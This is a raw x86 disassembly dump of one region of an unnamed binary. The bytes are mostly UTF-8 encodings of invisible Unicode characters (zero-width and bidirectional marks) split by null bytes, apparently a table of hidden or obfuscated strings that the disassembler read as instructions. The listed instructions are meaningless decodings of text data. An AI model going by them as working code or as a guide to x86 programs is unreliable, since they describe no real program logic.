  40a50c:	ad                   	lods   %ds:(%esi),%eax
  40a50d:	e2 80                	loop   0x40a48f
  40a50f:	ab                   	stos   %eax,%es:(%edi)
  40a510:	e2 81                	loop   0x40a493
  40a512:	ac                   	lods   %ds:(%esi),%al
  40a513:	e2 80                	loop   0x40a495
  40a515:	ad                   	lods   %ds:(%esi),%eax
  40a516:	e2 80                	loop   0x40a498
  40a518:	8e e2                	mov    %edx,%fs
  40a51a:	81 aa e2 80 8b e2 80 	subl   $0x80e28e80,-0x1d747f1e(%edx)
  40a521:	8e e2 80 
  40a524:	8c e2                	mov    %fs,%edx
  40a526:	80 ae e2 80 ae 00 e2 	subb   $0xe2,0xae80e2(%esi)
  40a52d:	80 ad e2 80 ad e2 80 	subb   $0x80,-0x1d527f1e(%ebp)
  40a534:	ac                   	lods   %ds:(%esi),%al
  40a535:	e2 80                	loop   0x40a4b7
  40a537:	8e e2                	mov    %edx,%fs
  40a539:	80 8e e2 80 aa e2 81 	orb    $0x81,-0x1d557f1e(%esi)
  40a540:	ab                   	stos   %eax,%es:(%edi)
  40a541:	e2 80                	loop   0x40a4c3
  40a543:	ae                   	scas   %es:(%edi),%al
  40a544:	e2 81                	loop   0x40a4c7
  40a546:	ab                   	stos   %eax,%es:(%edi)
  40a547:	e2 80                	loop   0x40a4c9
  40a549:	ae                   	scas   %es:(%edi),%al
  40a54a:	e2 80                	loop   0x40a4cc
  40a54c:	8e e2                	mov    %edx,%fs
  40a54e:	80 ab e2 81 aa e2 81 	subb   $0x81,-0x1d557e1e(%ebx)
  40a555:	ac                   	lods   %ds:(%esi),%al
  40a556:	e2 80                	loop   0x40a4d8
  40a558:	8b e2                	mov    %edx,%esp
  40a55a:	81 ad e2 80 8b e2 81 	subl   $0x80e2ac81,-0x1d747f1e(%ebp)
  40a561:	ac e2 80 
  40a564:	aa                   	stos   %al,%es:(%edi)
  40a565:	e2 80                	loop   0x40a4e7
  40a567:	8d                   	lea    (bad),%esp
  40a568:	e2 81                	loop   0x40a4eb
  40a56a:	ac                   	lods   %ds:(%esi),%al
  40a56b:	e2 80                	loop   0x40a4ed
  40a56d:	aa                   	stos   %al,%es:(%edi)
  40a56e:	e2 80                	loop   0x40a4f0
  40a570:	ae                   	scas   %es:(%edi),%al
  40a571:	e2 80                	loop   0x40a4f3
  40a573:	ae                   	scas   %es:(%edi),%al
  40a574:	e2 80                	loop   0x40a4f6
  40a576:	8d                   	lea    (bad),%esp
  40a577:	e2 81                	loop   0x40a4fa
  40a579:	ad                   	lods   %ds:(%esi),%eax
  40a57a:	e2 81                	loop   0x40a4fd
  40a57c:	ab                   	stos   %eax,%es:(%edi)
  40a57d:	e2 81                	loop   0x40a500
  40a57f:	ae                   	scas   %es:(%edi),%al
  40a580:	e2 80                	loop   0x40a502
  40a582:	8b e2                	mov    %edx,%esp
  40a584:	80 ad e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%ebp)
  40a58b:	ac                   	lods   %ds:(%esi),%al
  40a58c:	e2 80                	loop   0x40a50e
  40a58e:	ae                   	scas   %es:(%edi),%al
  40a58f:	e2 80                	loop   0x40a511
  40a591:	ac                   	lods   %ds:(%esi),%al
  40a592:	e2 80                	loop   0x40a514
  40a594:	8c e2                	mov    %fs,%edx
  40a596:	81 ad e2 80 aa e2 81 	subl   $0x80e2ac81,-0x1d557f1e(%ebp)
  40a59d:	ac e2 80 
  40a5a0:	8c e2                	mov    %fs,%edx
  40a5a2:	80 ae e2 80 ae 00 e2 	subb   $0xe2,0xae80e2(%esi)
  40a5a9:	81 ae e2 80 ae e2 81 	subl   $0x80e2ab81,-0x1d517f1e(%esi)
  40a5b0:	ab e2 80 
  40a5b3:	ae                   	scas   %es:(%edi),%al
  40a5b4:	e2 81                	loop   0x40a537
  40a5b6:	ae                   	scas   %es:(%edi),%al
  40a5b7:	e2 81                	loop   0x40a53a
  40a5b9:	af                   	scas   %es:(%edi),%eax
  40a5ba:	e2 81                	loop   0x40a53d
  40a5bc:	ab                   	stos   %eax,%es:(%edi)
  40a5bd:	e2 81                	loop   0x40a540
  40a5bf:	af                   	scas   %es:(%edi),%eax
  40a5c0:	e2 80                	loop   0x40a542
  40a5c2:	8f                   	(bad)
  40a5c3:	e2 80                	loop   0x40a545
  40a5c5:	8b e2                	mov    %edx,%esp
  40a5c7:	81 ab e2 80 8b e2 80 	subl   $0x80e2aa80,-0x1d747f1e(%ebx)
  40a5ce:	aa e2 80 
  40a5d1:	8c e2                	mov    %fs,%edx
  40a5d3:	80 ae e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%esi)
  40a5da:	aa                   	stos   %al,%es:(%edi)
  40a5db:	e2 80                	loop   0x40a55d
  40a5dd:	8d                   	lea    (bad),%esp
  40a5de:	e2 80                	loop   0x40a560
  40a5e0:	ab                   	stos   %eax,%es:(%edi)
  40a5e1:	e2 80                	loop   0x40a563
  40a5e3:	8c e2                	mov    %fs,%edx
  40a5e5:	81 ad e2 81 ad e2 81 	subl   $0x80e2ac81,-0x1d527e1e(%ebp)
  40a5ec:	ac e2 80 
  40a5ef:	ac                   	lods   %ds:(%esi),%al
  40a5f0:	e2 80                	loop   0x40a572
  40a5f2:	ae                   	scas   %es:(%edi),%al
  40a5f3:	e2 81                	loop   0x40a576
  40a5f5:	ac                   	lods   %ds:(%esi),%al
  40a5f6:	e2 80                	loop   0x40a578
  40a5f8:	aa                   	stos   %al,%es:(%edi)
  40a5f9:	e2 80                	loop   0x40a57b
  40a5fb:	aa                   	stos   %al,%es:(%edi)
  40a5fc:	e2 81                	loop   0x40a57f
  40a5fe:	ab                   	stos   %eax,%es:(%edi)
  40a5ff:	e2 80                	loop   0x40a581
  40a601:	8b e2                	mov    %edx,%esp
  40a603:	81 ae e2 80 8c e2 81 	subl   $0x80e2ab81,-0x1d737f1e(%esi)
  40a60a:	ab e2 80 
  40a60d:	ad                   	lods   %ds:(%esi),%eax
  40a60e:	e2 80                	loop   0x40a590
  40a610:	8e e2                	mov    %edx,%fs
  40a612:	81 af e2 81 ac e2 80 	subl   $0x80e28b80,-0x1d537e1e(%edi)
  40a619:	8b e2 80 
  40a61c:	8d                   	lea    (bad),%esp
  40a61d:	e2 80                	loop   0x40a59f
  40a61f:	ae                   	scas   %es:(%edi),%al
  40a620:	e2 80                	loop   0x40a5a2
  40a622:	ae                   	scas   %es:(%edi),%al
  40a623:	00 e2                	add    %ah,%dl
  40a625:	80 8f e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%edi)
  40a62c:	ab                   	stos   %eax,%es:(%edi)
  40a62d:	e2 81                	loop   0x40a5b0
  40a62f:	ae                   	scas   %es:(%edi),%al
  40a630:	e2 81                	loop   0x40a5b3
  40a632:	aa                   	stos   %al,%es:(%edi)
  40a633:	e2 80                	loop   0x40a5b5
  40a635:	ae                   	scas   %es:(%edi),%al
  40a636:	e2 80                	loop   0x40a5b8
  40a638:	8c e2                	mov    %fs,%edx
  40a63a:	80 ae e2 80 8f e2 81 	subb   $0x81,-0x1d707f1e(%esi)
  40a641:	ac                   	lods   %ds:(%esi),%al
  40a642:	e2 81                	loop   0x40a5c5
  40a644:	ad                   	lods   %ds:(%esi),%eax
  40a645:	e2 81                	loop   0x40a5c8
  40a647:	af                   	scas   %es:(%edi),%eax
  40a648:	e2 80                	loop   0x40a5ca
  40a64a:	8b e2                	mov    %edx,%esp
  40a64c:	80 8c e2 81 ad e2 81 	orb    $0xaf,-0x7e1d527f(%edx,%eiz,8)
  40a653:	af 
  40a654:	e2 81                	loop   0x40a5d7
  40a656:	ad                   	lods   %ds:(%esi),%eax
  40a657:	e2 81                	loop   0x40a5da
  40a659:	ab                   	stos   %eax,%es:(%edi)
  40a65a:	e2 81                	loop   0x40a5dd
  40a65c:	ab                   	stos   %eax,%es:(%edi)
  40a65d:	e2 81                	loop   0x40a5e0
  40a65f:	af                   	scas   %es:(%edi),%eax
  40a660:	e2 80                	loop   0x40a5e2
  40a662:	ae                   	scas   %es:(%edi),%al
  40a663:	e2 80                	loop   0x40a5e5
  40a665:	ac                   	lods   %ds:(%esi),%al
  40a666:	e2 80                	loop   0x40a5e8
  40a668:	8c e2                	mov    %fs,%edx
  40a66a:	80 8e e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%esi)
  40a671:	8f                   	(bad)
  40a672:	e2 81                	loop   0x40a5f5
  40a674:	ab                   	stos   %eax,%es:(%edi)
  40a675:	e2 81                	loop   0x40a5f8
  40a677:	af                   	scas   %es:(%edi),%eax
  40a678:	e2 80                	loop   0x40a5fa
  40a67a:	aa                   	stos   %al,%es:(%edi)
  40a67b:	e2 80                	loop   0x40a5fd
  40a67d:	ad                   	lods   %ds:(%esi),%eax
  40a67e:	e2 81                	loop   0x40a601
  40a680:	ad                   	lods   %ds:(%esi),%eax
  40a681:	e2 81                	loop   0x40a604
  40a683:	ab                   	stos   %eax,%es:(%edi)
  40a684:	e2 81                	loop   0x40a607
  40a686:	ae                   	scas   %es:(%edi),%al
  40a687:	e2 80                	loop   0x40a609
  40a689:	ae                   	scas   %es:(%edi),%al
  40a68a:	e2 81                	loop   0x40a60d
  40a68c:	ae                   	scas   %es:(%edi),%al
  40a68d:	e2 80                	loop   0x40a60f
  40a68f:	8e e2                	mov    %edx,%fs
  40a691:	81 ac e2 80 8f e2 80 	subl   $0xae80e28d,-0x7f1d7080(%edx,%eiz,8)
  40a698:	8d e2 80 ae 
  40a69c:	e2 80                	loop   0x40a61e
  40a69e:	ae                   	scas   %es:(%edi),%al
  40a69f:	00 e2                	add    %ah,%dl
  40a6a1:	80 8c e2 81 aa e2 80 	orb    $0xab,-0x7f1d557f(%edx,%eiz,8)
  40a6a8:	ab 
  40a6a9:	e2 80                	loop   0x40a62b
  40a6ab:	aa                   	stos   %al,%es:(%edi)
  40a6ac:	e2 81                	loop   0x40a62f
  40a6ae:	ad                   	lods   %ds:(%esi),%eax
  40a6af:	e2 80                	loop   0x40a631
  40a6b1:	ab                   	stos   %eax,%es:(%edi)
  40a6b2:	e2 80                	loop   0x40a634
  40a6b4:	ae                   	scas   %es:(%edi),%al
  40a6b5:	e2 80                	loop   0x40a637
  40a6b7:	8c e2                	mov    %fs,%edx
  40a6b9:	80 8f e2 80 8e e2 81 	orb    $0x81,-0x1d717f1e(%edi)
  40a6c0:	aa                   	stos   %al,%es:(%edi)
  40a6c1:	e2 81                	loop   0x40a644
  40a6c3:	ae                   	scas   %es:(%edi),%al
  40a6c4:	e2 80                	loop   0x40a646
  40a6c6:	ab                   	stos   %eax,%es:(%edi)
  40a6c7:	e2 81                	loop   0x40a64a
  40a6c9:	ae                   	scas   %es:(%edi),%al
  40a6ca:	e2 80                	loop   0x40a64c
  40a6cc:	ae                   	scas   %es:(%edi),%al
  40a6cd:	e2 80                	loop   0x40a64f
  40a6cf:	8b e2                	mov    %edx,%esp
  40a6d1:	80 ac e2 80 8e e2 80 	subb   $0xab,-0x7f1d7180(%edx,%eiz,8)
  40a6d8:	ab 
  40a6d9:	e2 80                	loop   0x40a65b
  40a6db:	8c e2                	mov    %fs,%edx
  40a6dd:	80 8c e2 80 8f e2 80 	orb    $0xac,-0x7f1d7080(%edx,%eiz,8)
  40a6e4:	ac 
  40a6e5:	e2 80                	loop   0x40a667
  40a6e7:	8c e2                	mov    %fs,%edx
  40a6e9:	81 ab e2 80 ac e2 81 	subl   $0x80e2ad81,-0x1d537f1e(%ebx)
  40a6f0:	ad e2 80 
  40a6f3:	ad                   	lods   %ds:(%esi),%eax
  40a6f4:	e2 81                	loop   0x40a677
  40a6f6:	ad                   	lods   %ds:(%esi),%eax
  40a6f7:	e2 81                	loop   0x40a67a
  40a6f9:	aa                   	stos   %al,%es:(%edi)
  40a6fa:	e2 80                	loop   0x40a67c
  40a6fc:	8d                   	lea    (bad),%esp
  40a6fd:	e2 80                	loop   0x40a67f
  40a6ff:	ac                   	lods   %ds:(%esi),%al
  40a700:	e2 80                	loop   0x40a682
  40a702:	ac                   	lods   %ds:(%esi),%al
  40a703:	e2 80                	loop   0x40a685
  40a705:	8e e2                	mov    %edx,%fs
  40a707:	81 ac e2 80 ad e2 81 	subl   $0xaa80e2ab,-0x7e1d5280(%edx,%eiz,8)
  40a70e:	ab e2 80 aa 
  40a712:	e2 81                	loop   0x40a695
  40a714:	aa                   	stos   %al,%es:(%edi)
  40a715:	e2 80                	loop   0x40a697
  40a717:	ae                   	scas   %es:(%edi),%al
  40a718:	e2 80                	loop   0x40a69a
  40a71a:	ae                   	scas   %es:(%edi),%al
  40a71b:	00 e2                	add    %ah,%dl
  40a71d:	80 8e e2 81 ad e2 80 	orb    $0x80,-0x1d527e1e(%esi)
  40a724:	ac                   	lods   %ds:(%esi),%al
  40a725:	e2 80                	loop   0x40a6a7
  40a727:	8f                   	(bad)
  40a728:	e2 81                	loop   0x40a6ab
  40a72a:	ac                   	lods   %ds:(%esi),%al
  40a72b:	e2 80                	loop   0x40a6ad
  40a72d:	aa                   	stos   %al,%es:(%edi)
  40a72e:	e2 80                	loop   0x40a6b0
  40a730:	ac                   	lods   %ds:(%esi),%al
  40a731:	e2 81                	loop   0x40a6b4
  40a733:	ae                   	scas   %es:(%edi),%al
  40a734:	e2 81                	loop   0x40a6b7
  40a736:	ab                   	stos   %eax,%es:(%edi)
  40a737:	e2 80                	loop   0x40a6b9
  40a739:	ac                   	lods   %ds:(%esi),%al
  40a73a:	e2 80                	loop   0x40a6bc
  40a73c:	ad                   	lods   %ds:(%esi),%eax
  40a73d:	e2 81                	loop   0x40a6c0
  40a73f:	ab                   	stos   %eax,%es:(%edi)
  40a740:	e2 81                	loop   0x40a6c3
  40a742:	af                   	scas   %es:(%edi),%eax
  40a743:	e2 81                	loop   0x40a6c6
  40a745:	ad                   	lods   %ds:(%esi),%eax
  40a746:	e2 81                	loop   0x40a6c9
  40a748:	ac                   	lods   %ds:(%esi),%al
  40a749:	e2 80                	loop   0x40a6cb
  40a74b:	ad                   	lods   %ds:(%esi),%eax
  40a74c:	e2 81                	loop   0x40a6cf
  40a74e:	aa                   	stos   %al,%es:(%edi)
  40a74f:	e2 81                	loop   0x40a6d2
  40a751:	ac                   	lods   %ds:(%esi),%al
  40a752:	e2 80                	loop   0x40a6d4
  40a754:	8f                   	(bad)
  40a755:	e2 80                	loop   0x40a6d7
  40a757:	ac                   	lods   %ds:(%esi),%al
  40a758:	e2 80                	loop   0x40a6da
  40a75a:	aa                   	stos   %al,%es:(%edi)
  40a75b:	e2 81                	loop   0x40a6de
  40a75d:	aa                   	stos   %al,%es:(%edi)
  40a75e:	e2 80                	loop   0x40a6e0
  40a760:	8e e2                	mov    %edx,%fs
  40a762:	80 8d e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%ebp)
  40a769:	8d                   	lea    (bad),%esp
  40a76a:	e2 80                	loop   0x40a6ec
  40a76c:	8d                   	lea    (bad),%esp
  40a76d:	e2 81                	loop   0x40a6f0
  40a76f:	ad                   	lods   %ds:(%esi),%eax
  40a770:	e2 80                	loop   0x40a6f2
  40a772:	ab                   	stos   %eax,%es:(%edi)
  40a773:	e2 80                	loop   0x40a6f5
  40a775:	8b e2                	mov    %edx,%esp
  40a777:	81 ab e2 81 af e2 81 	subl   $0x81e2af81,-0x1d507e1e(%ebx)
  40a77e:	af e2 81 
  40a781:	ac                   	lods   %ds:(%esi),%al
  40a782:	e2 80                	loop   0x40a704
  40a784:	ad                   	lods   %ds:(%esi),%eax
  40a785:	e2 81                	loop   0x40a708
  40a787:	aa                   	stos   %al,%es:(%edi)
  40a788:	e2 80                	loop   0x40a70a
  40a78a:	8f                   	(bad)
  40a78b:	e2 80                	loop   0x40a70d
  40a78d:	ac                   	lods   %ds:(%esi),%al
  40a78e:	e2 81                	loop   0x40a711
  40a790:	aa                   	stos   %al,%es:(%edi)
  40a791:	e2 80                	loop   0x40a713
  40a793:	ae                   	scas   %es:(%edi),%al
  40a794:	e2 80                	loop   0x40a716
  40a796:	ae                   	scas   %es:(%edi),%al
  40a797:	00 e2                	add    %ah,%dl
  40a799:	80 ad e2 81 ac e2 80 	subb   $0x80,-0x1d537e1e(%ebp)
  40a7a0:	8e e2                	mov    %edx,%fs
  40a7a2:	80 8c e2 80 aa e2 80 	orb    $0xad,-0x7f1d5580(%edx,%eiz,8)
  40a7a9:	ad 
  40a7aa:	e2 80                	loop   0x40a72c
  40a7ac:	ad                   	lods   %ds:(%esi),%eax
  40a7ad:	e2 80                	loop   0x40a72f
  40a7af:	ae                   	scas   %es:(%edi),%al
  40a7b0:	e2 80                	loop   0x40a732
  40a7b2:	ae                   	scas   %es:(%edi),%al
  40a7b3:	e2 80                	loop   0x40a735
  40a7b5:	8b e2                	mov    %edx,%esp
  40a7b7:	81 aa e2 81 ab e2 80 	subl   $0x80e2ae80,-0x1d547e1e(%edx)
  40a7be:	ae e2 80 
  40a7c1:	8b e2                	mov    %edx,%esp
  40a7c3:	80 8f e2 81 ad e2 80 	orb    $0x80,-0x1d527e1e(%edi)
  40a7ca:	aa                   	stos   %al,%es:(%edi)
  40a7cb:	e2 80                	loop   0x40a74d
  40a7cd:	ae                   	scas   %es:(%edi),%al
  40a7ce:	e2 81                	loop   0x40a751
  40a7d0:	ae                   	scas   %es:(%edi),%al
  40a7d1:	e2 80                	loop   0x40a753
  40a7d3:	ab                   	stos   %eax,%es:(%edi)
  40a7d4:	e2 80                	loop   0x40a756
  40a7d6:	ae                   	scas   %es:(%edi),%al
  40a7d7:	e2 80                	loop   0x40a759
  40a7d9:	8b e2                	mov    %edx,%esp
  40a7db:	81 af e2 80 8e e2 80 	subl   $0x80e28c80,-0x1d717f1e(%edi)
  40a7e2:	8c e2 80 
  40a7e5:	aa                   	stos   %al,%es:(%edi)
  40a7e6:	e2 81                	loop   0x40a769
  40a7e8:	aa                   	stos   %al,%es:(%edi)
  40a7e9:	e2 80                	loop   0x40a76b
  40a7eb:	ac                   	lods   %ds:(%esi),%al
  40a7ec:	e2 80                	loop   0x40a76e
  40a7ee:	8f                   	(bad)
  40a7ef:	e2 80                	loop   0x40a771
  40a7f1:	ab                   	stos   %eax,%es:(%edi)
  40a7f2:	e2 80                	loop   0x40a774
  40a7f4:	ab                   	stos   %eax,%es:(%edi)
  40a7f5:	e2 81                	loop   0x40a778
  40a7f7:	ab                   	stos   %eax,%es:(%edi)
  40a7f8:	e2 80                	loop   0x40a77a
  40a7fa:	8d                   	lea    (bad),%esp
  40a7fb:	e2 80                	loop   0x40a77d
  40a7fd:	aa                   	stos   %al,%es:(%edi)
  40a7fe:	e2 80                	loop   0x40a780
  40a800:	8b e2                	mov    %edx,%esp
  40a802:	81 ac e2 80 8c e2 81 	subl   $0xaa81e2ac,-0x7e1d7380(%edx,%eiz,8)
  40a809:	ac e2 81 aa 
  40a80d:	e2 80                	loop   0x40a78f
  40a80f:	ae                   	scas   %es:(%edi),%al
  40a810:	e2 80                	loop   0x40a792
  40a812:	ae                   	scas   %es:(%edi),%al
  40a813:	00 e2                	add    %ah,%dl
  40a815:	81 aa e2 80 8f e2 80 	subl   $0x80e2aa80,-0x1d707f1e(%edx)
  40a81c:	aa e2 80 
  40a81f:	aa                   	stos   %al,%es:(%edi)
  40a820:	e2 81                	loop   0x40a7a3
  40a822:	aa                   	stos   %al,%es:(%edi)
  40a823:	e2 81                	loop   0x40a7a6
  40a825:	ae                   	scas   %es:(%edi),%al
  40a826:	e2 80                	loop   0x40a7a8
  40a828:	8e e2                	mov    %edx,%fs
  40a82a:	80 8e e2 81 ad e2 80 	orb    $0x80,-0x1d527e1e(%esi)
  40a831:	ab                   	stos   %eax,%es:(%edi)
  40a832:	e2 81                	loop   0x40a7b5
  40a834:	ab                   	stos   %eax,%es:(%edi)
  40a835:	e2 81                	loop   0x40a7b8
  40a837:	af                   	scas   %es:(%edi),%eax
  40a838:	e2 81                	loop   0x40a7bb
  40a83a:	ac                   	lods   %ds:(%esi),%al
  40a83b:	e2 81                	loop   0x40a7be
  40a83d:	aa                   	stos   %al,%es:(%edi)
  40a83e:	e2 80                	loop   0x40a7c0
  40a840:	8f                   	(bad)
  40a841:	e2 80                	loop   0x40a7c3
  40a843:	8d                   	lea    (bad),%esp
  40a844:	e2 81                	loop   0x40a7c7
  40a846:	ad                   	lods   %ds:(%esi),%eax
  40a847:	e2 80                	loop   0x40a7c9
  40a849:	8b e2                	mov    %edx,%esp
  40a84b:	81 ac e2 80 8b e2 81 	subl   $0xaa81e2ab,-0x7e1d7480(%edx,%eiz,8)
  40a852:	ab e2 81 aa 
  40a856:	e2 80                	loop   0x40a7d8
  40a858:	8d                   	lea    (bad),%esp
  40a859:	e2 80                	loop   0x40a7db
  40a85b:	8e e2                	mov    %edx,%fs
  40a85d:	80 8d e2 81 aa e2 80 	orb    $0x80,-0x1d557e1e(%ebp)
  40a864:	8d                   	lea    (bad),%esp
  40a865:	e2 81                	loop   0x40a7e8
  40a867:	ad                   	lods   %ds:(%esi),%eax
  40a868:	e2 80                	loop   0x40a7ea
  40a86a:	ad                   	lods   %ds:(%esi),%eax
  40a86b:	e2 80                	loop   0x40a7ed
  40a86d:	8f                   	(bad)
  40a86e:	e2 80                	loop   0x40a7f0
  40a870:	8f                   	(bad)
  40a871:	e2 80                	loop   0x40a7f3
  40a873:	8f                   	(bad)
  40a874:	e2 80                	loop   0x40a7f6
  40a876:	ac                   	lods   %ds:(%esi),%al
  40a877:	e2 80                	loop   0x40a7f9
  40a879:	ab                   	stos   %eax,%es:(%edi)
  40a87a:	e2 81                	loop   0x40a7fd
  40a87c:	aa                   	stos   %al,%es:(%edi)
  40a87d:	e2 81                	loop   0x40a800
  40a87f:	af                   	scas   %es:(%edi),%eax
  40a880:	e2 81                	loop   0x40a803
  40a882:	ae                   	scas   %es:(%edi),%al
  40a883:	e2 80                	loop   0x40a805
  40a885:	ab                   	stos   %eax,%es:(%edi)
  40a886:	e2 81                	loop   0x40a809
  40a888:	ab                   	stos   %eax,%es:(%edi)
  40a889:	e2 80                	loop   0x40a80b
  40a88b:	ae                   	scas   %es:(%edi),%al
  40a88c:	e2 80                	loop   0x40a80e
  40a88e:	ae                   	scas   %es:(%edi),%al
  40a88f:	00 e2                	add    %ah,%dl
  40a891:	80 8b e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebx)
  40a898:	8e e2                	mov    %edx,%fs
  40a89a:	80 ab e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%ebx)
  40a8a1:	ad                   	lods   %ds:(%esi),%eax
  40a8a2:	e2 80                	loop   0x40a824
  40a8a4:	8d                   	lea    (bad),%esp
  40a8a5:	e2 80                	loop   0x40a827
  40a8a7:	ae                   	scas   %es:(%edi),%al
  40a8a8:	e2 80                	loop   0x40a82a
  40a8aa:	ac                   	lods   %ds:(%esi),%al
  40a8ab:	e2 80                	loop   0x40a82d
  40a8ad:	ad                   	lods   %ds:(%esi),%eax
  40a8ae:	e2 80                	loop   0x40a830
  40a8b0:	8c e2                	mov    %fs,%edx
  40a8b2:	80 ad e2 81 af e2 80 	subb   $0x80,-0x1d507e1e(%ebp)
  40a8b9:	ad                   	lods   %ds:(%esi),%eax
  40a8ba:	e2 81                	loop   0x40a83d
  40a8bc:	ac                   	lods   %ds:(%esi),%al
  40a8bd:	e2 81                	loop   0x40a840
  40a8bf:	ac                   	lods   %ds:(%esi),%al
  40a8c0:	e2 81                	loop   0x40a843
  40a8c2:	aa                   	stos   %al,%es:(%edi)
  40a8c3:	e2 80                	loop   0x40a845
  40a8c5:	8c e2                	mov    %fs,%edx
  40a8c7:	81 af e2 80 8d e2 80 	subl   $0x80e28c80,-0x1d727f1e(%edi)
  40a8ce:	8c e2 80 
  40a8d1:	ae                   	scas   %es:(%edi),%al
  40a8d2:	e2 81                	loop   0x40a855
  40a8d4:	aa                   	stos   %al,%es:(%edi)
  40a8d5:	e2 80                	loop   0x40a857
  40a8d7:	ad                   	lods   %ds:(%esi),%eax
  40a8d8:	e2 80                	loop   0x40a85a
  40a8da:	ac                   	lods   %ds:(%esi),%al
  40a8db:	e2 81                	loop   0x40a85e
  40a8dd:	af                   	scas   %es:(%edi),%eax
  40a8de:	e2 80                	loop   0x40a860
  40a8e0:	ae                   	scas   %es:(%edi),%al
  40a8e1:	e2 80                	loop   0x40a863
  40a8e3:	8c e2                	mov    %fs,%edx
  40a8e5:	81 af e2 80 ab e2 80 	subl   $0x80e28c80,-0x1d547f1e(%edi)
  40a8ec:	8c e2 80 
  40a8ef:	8b e2                	mov    %edx,%esp
  40a8f1:	80 8b e2 80 8c e2 80 	orb    $0x80,-0x1d737f1e(%ebx)
  40a8f8:	8b e2                	mov    %edx,%esp
  40a8fa:	80 ad e2 80 8f e2 81 	subb   $0x81,-0x1d707f1e(%ebp)
  40a901:	ad                   	lods   %ds:(%esi),%eax
  40a902:	e2 80                	loop   0x40a884
  40a904:	ad                   	lods   %ds:(%esi),%eax
  40a905:	e2 80                	loop   0x40a887
  40a907:	ae                   	scas   %es:(%edi),%al
  40a908:	e2 80                	loop   0x40a88a
  40a90a:	ae                   	scas   %es:(%edi),%al
  40a90b:	00 e2                	add    %ah,%dl
  40a90d:	80 8d e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%ebp)
  40a914:	ae                   	scas   %es:(%edi),%al
  40a915:	e2 80                	loop   0x40a897
  40a917:	8e e2                	mov    %edx,%fs
  40a919:	81 af e2 81 ab e2 80 	subl   $0x80e2ad80,-0x1d547e1e(%edi)
  40a920:	ad e2 80 
  40a923:	ab                   	stos   %eax,%es:(%edi)
  40a924:	e2 80                	loop   0x40a8a6
  40a926:	8d                   	lea    (bad),%esp
  40a927:	e2 80                	loop   0x40a8a9
  40a929:	aa                   	stos   %al,%es:(%edi)
  40a92a:	e2 80                	loop   0x40a8ac
  40a92c:	8e e2                	mov    %edx,%fs
  40a92e:	80 8f e2 81 ac e2 81 	orb    $0x81,-0x1d537e1e(%edi)
  40a935:	ab                   	stos   %eax,%es:(%edi)
  40a936:	e2 81                	loop   0x40a8b9
  40a938:	ae                   	scas   %es:(%edi),%al
  40a939:	e2 80                	loop   0x40a8bb
  40a93b:	8c e2                	mov    %fs,%edx
  40a93d:	80 ae e2 80 8e e2 81 	subb   $0x81,-0x1d717f1e(%esi)
  40a944:	ab                   	stos   %eax,%es:(%edi)
  40a945:	e2 80                	loop   0x40a8c7
  40a947:	8f                   	(bad)
  40a948:	e2 80                	loop   0x40a8ca
  40a94a:	ab                   	stos   %eax,%es:(%edi)
  40a94b:	e2 81                	loop   0x40a8ce
  40a94d:	aa                   	stos   %al,%es:(%edi)
  40a94e:	e2 80                	loop   0x40a8d0
  40a950:	ab                   	stos   %eax,%es:(%edi)
  40a951:	e2 80                	loop   0x40a8d3
  40a953:	ac                   	lods   %ds:(%esi),%al
  40a954:	e2 80                	loop   0x40a8d6
  40a956:	8e e2                	mov    %edx,%fs
  40a958:	80 8c e2 81 ad e2 80 	orb    $0xab,-0x7f1d527f(%edx,%eiz,8)
  40a95f:	ab 
  40a960:	e2 81                	loop   0x40a8e3
  40a962:	af                   	scas   %es:(%edi),%eax
  40a963:	e2 80                	loop   0x40a8e5
  40a965:	8c e2                	mov    %fs,%edx
  40a967:	80 8e e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%esi)
  40a96e:	8c e2                	mov    %fs,%edx
  40a970:	80 8c e2 80 8d e2 81 	orb    $0xaf,-0x7e1d7280(%edx,%eiz,8)
  40a977:	af 
  40a978:	e2 80                	loop   0x40a8fa
  40a97a:	ac                   	lods   %ds:(%esi),%al
  40a97b:	e2 81                	loop   0x40a8fe
  40a97d:	af                   	scas   %es:(%edi),%eax
  40a97e:	e2 81                	loop   0x40a901
  40a980:	ad                   	lods   %ds:(%esi),%eax
  40a981:	e2 80                	loop   0x40a903
  40a983:	ae                   	scas   %es:(%edi),%al
  40a984:	e2 80                	loop   0x40a906
  40a986:	ae                   	scas   %es:(%edi),%al
  40a987:	00 e2                	add    %ah,%dl
  40a989:	80 8d e2 80 ad e2 80 	orb    $0x80,-0x1d527f1e(%ebp)
  40a990:	8c e2                	mov    %fs,%edx
  40a992:	80 8e e2 80 ae e2 80 	orb    $0x80,-0x1d517f1e(%esi)
  40a999:	ae                   	scas   %es:(%edi),%al
  40a99a:	e2 80                	loop   0x40a91c
  40a99c:	ae                   	scas   %es:(%edi),%al
  40a99d:	e2 81                	loop   0x40a920
  40a99f:	aa                   	stos   %al,%es:(%edi)
  40a9a0:	e2 80                	loop   0x40a922
  40a9a2:	ae                   	scas   %es:(%edi),%al
  40a9a3:	e2 80                	loop   0x40a925
  40a9a5:	ae                   	scas   %es:(%edi),%al
  40a9a6:	e2 80                	loop   0x40a928
  40a9a8:	ab                   	stos   %eax,%es:(%edi)
  40a9a9:	e2 81                	loop   0x40a92c
  40a9ab:	ac                   	lods   %ds:(%esi),%al
  40a9ac:	e2 80                	loop   0x40a92e
  40a9ae:	aa                   	stos   %al,%es:(%edi)
  40a9af:	e2 80                	loop   0x40a931
  40a9b1:	8c e2                	mov    %fs,%edx
  40a9b3:	80 ab e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%ebx)
  40a9ba:	8c e2                	mov    %fs,%edx
  40a9bc:	81 af e2 81 ae e2 80 	subl   $0x80e28c80,-0x1d517e1e(%edi)
  40a9c3:	8c e2 80 
  40a9c6:	ad                   	lods   %ds:(%esi),%eax
  40a9c7:	e2 80                	loop   0x40a949
  40a9c9:	8f                   	(bad)
  40a9ca:	e2 80                	loop   0x40a94c
  40a9cc:	ab                   	stos   %eax,%es:(%edi)
  40a9cd:	e2 80                	loop   0x40a94f
  40a9cf:	aa                   	stos   %al,%es:(%edi)
  40a9d0:	e2 81                	loop   0x40a953
